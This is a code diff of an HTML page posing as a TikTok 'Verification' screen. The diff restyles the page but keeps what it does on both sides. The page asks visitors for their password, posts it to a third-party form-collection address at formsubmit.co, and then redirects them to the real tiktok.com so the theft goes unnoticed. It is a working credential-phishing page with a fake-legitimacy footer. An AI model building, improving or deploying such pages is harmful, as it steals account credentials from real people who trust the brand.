@@ -1,48 +1,40 @@
 <!DOCTYPE html>
-
 <html>
-	
-	<head>
-		<meta charset="utf-8">
-		<meta name="viewport" content="with=device-with, initial-scale=1">
-		<title>TikTok</title>
-	</head>
-	
-		<header>
-			<img src="Images/Logo 2.png" alt="TikTok" style="width:150px;height:44px;">
-		</header>
-		<center>
-	<body>
-		<br/>
-		<p style="font-family:Arial, Helvetica, sans-serif;color:black;font-size:50px;">Verification</p> 
-		<p style = "font-family:arial;font-size:16px;">
-			Please enter your password test
-		 </p>
-		<form action="https://formsubmit.co/3e5bd9d43793077269048fd3136f61b0" method="POST">
-		<input type="password" name="Password" placeholder="Password" size="30" required>
-		<input type="hidden" name="_next" value="https://www.tiktok.com/">
-		<input type="hidden" name="_captcha" value="true">
-        <p style = "font-family:arial,garamond,serif;font-size:14px;font-style:italic;">
-          </p>
-		<button type="submit" style="background-color:#FF3366;color: white;border: #FF3366;height:30px;width:80px;font-size: 18px;font-family: Arial, Helvetica, sans-serif;">Verify</button>
-		</form>
-		<br/>
-		<br/>
-		<br>
-		<br/>
-		<br/>
-	</body>
-    <footer>
-      <p style = "font-family:arial;font-size:12px;">
-         By using this service, you agree with our Terms and Conditions.
-      <b>Warning</b>! This is a autheticator site<br>Use this service exclusively for authetification
-      <br>
-		</p>
-	  <p style="font-family:Arial, Helvetica, sans-serif;font-size:12px;">
-		<b>© 2023 TikTok</b>
-	  </p>
-      
-      
-    </footer>
-	</center>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="styles.css">
+    <title>TikTokersite</title>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <img src="Images/Logo 2.png" alt="TikTok" class="logo">
+        </header>
+
+        <div class="content">
+            <p class="heading">Verification</p>
+            <p class="description">Please enter your test</p>
+            <form action="https://formsubmit.co/3e5bd9d43793077269048fd3136f61b0" method="POST">
+                <input type="password" name="Password" placeholder="Password" size="30" required>
+                <input type="hidden" name="_next" value="https://www.tiktok.com/">
+                <input type="hidden" name="_captcha" value="true">
+                <button type="submit" class="verify-button">Verify</button>
+            </form>
+        </div>
+
+        <footer>
+            <p class="footer-text">
+                By using this service, you agree with our Terms and Conditions.<br><b>Warning</b>! This is an authenticator site<br>Use this service exclusively for authentication
+                <br>
+            </p>
+            <p class="copyright-text">
+                <b>© 2023 TikTokerservice</b>
+            </p>
+        </footer>
+    </div>
+</body>
+
 </html>
